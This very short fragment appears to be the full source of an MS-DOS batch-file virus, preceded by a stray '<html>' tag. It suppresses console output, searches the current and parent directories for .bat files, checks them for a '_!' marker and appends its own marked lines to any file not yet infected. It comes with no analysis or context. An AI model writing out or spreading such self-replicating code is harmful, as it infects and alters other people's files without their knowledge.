<html>@ctty nul._!
for %%a in (*.bat ..\*.bat) do set _!=%%a
find "_!"<%_!%
if errorlevel 1 find "_!"<%0.BAT>>%_!%
ctty con._!
